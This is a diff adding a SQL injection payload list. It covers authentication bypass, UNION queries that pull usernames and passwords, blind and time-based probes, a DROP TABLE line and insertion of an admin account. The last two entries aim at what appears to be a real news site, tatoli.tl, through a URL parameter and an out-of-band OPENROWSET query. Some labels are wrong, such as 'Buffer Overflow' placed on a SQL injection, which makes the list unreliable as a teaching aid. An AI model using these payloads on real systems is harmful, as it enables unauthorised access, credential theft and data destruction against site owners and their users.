@@ -1,0 +1,50 @@
+-- Basic Authentication Bypass
+' OR '1'='1' --
+
+-- Union-Based Injection
+' UNION SELECT NULL, username, password FROM users --
+
+-- Error-Based Injection
+' AND 1=CONVERT(int, (SELECT @@version)) --
+
+-- Blind SQL Injection
+' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' --
+
+-- Time-Based Blind SQL Injection
+' OR IF(1=1, SLEEP(5), 0) --
+
+-- Second-Order SQL Injection
+'; DROP TABLE users; --
+
+-- Stacked Queries (jika diizinkan)
+'; INSERT INTO users (username, password) VALUES ('admin', 'password'); --
+
+-- Dynamic SQL Injection
+' UNION SELECT CONCAT(username, ':', password) FROM users --
+
+-- Subquery Injection
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --
+
+-- Comment Injection
+' /* comment */ --
+
+-- Additional Complex Payloads
+' UNION SELECT 1, 'test', 'test' --
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'database_name' --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --
+' OR IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0) --
+
+-- Encoding Techniques
+' OR 1=1 /* comment */ --
+' UNION SELECT 1, 2, 3 /* comment */ --
+' UNION SELECT 0x554e494f4e, 1, 2 --  -- Hex Encoding
+
+-- Inline Comments
+/****/UNION/****/SELECT/****/1,2,3 --
+
+-- Buffer Overflow
+http://www.tatoli.tl/index.php?page_id=-15 AND (SELECT 1)=(SELECT 0xAA...<1000 "A">)
+
+-- Out-of-Band Techniques
+?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', 'https://www.tatoli.tl'; 'sa'; 'pwd', 'SELECT 1')
